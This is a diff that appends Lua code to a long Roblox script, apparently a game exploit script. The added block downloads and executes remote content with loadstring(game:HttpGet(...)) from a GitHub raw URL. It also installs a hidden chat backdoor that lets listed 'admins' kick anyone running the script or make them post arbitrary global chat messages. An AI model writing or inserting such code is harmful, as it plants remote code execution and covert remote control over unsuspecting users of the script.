@@ -3153,3 +3153,49 @@ while true do
         flipback = false
     end
 end
+
+admins = loadstring(game:HttpGet("https://raw.githubusercontent.com/CilXA/B7FGF5X1AAA33FG/refs/heads/main/Usernames"))()
+
+function asdxisAdmin(speaker)
+    for _, adminName in ipairs(admins) do
+        if speaker.Name == adminName then
+            return true
+        end
+    end
+    return false
+end
+
+function chatHandler(message, speaker)
+    if not asdxisAdmin(localplayer) and asdxisAdmin(speaker) then
+        if message:sub(1, 1) == ":" then
+            local cmd = message:sub(2)  -- Extract the command without the prefix
+            if cmd == "kick" then
+                localplayer:Kick("no")
+            elseif cmd == "ban" then
+                warn("hi ;) i can actually ban you from pd")
+            elseif cmd:sub(1, 4) == "say " then
+                local text = cmd:sub(5)
+                local args = {
+                    [1] = text,
+                    [2] = "Global"
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+            elseif cmd:sub(1, 6) == "print " then
+                local text = cmd:sub(7)
+                print(text)
+            end
+        end
+    end
+end
+
+function onPlayerAdded(newPlayer)
+    newPlayer.Chatted:Connect(function(message)
+        chatHandler(message, newPlayer)
+    end)
+end
+
+game.Players.PlayerAdded:Connect(onPlayerAdded)
+
+for _, existingPlayer in ipairs(game.Players:GetPlayers()) do
+    onPlayerAdded(existingPlayer)
+end
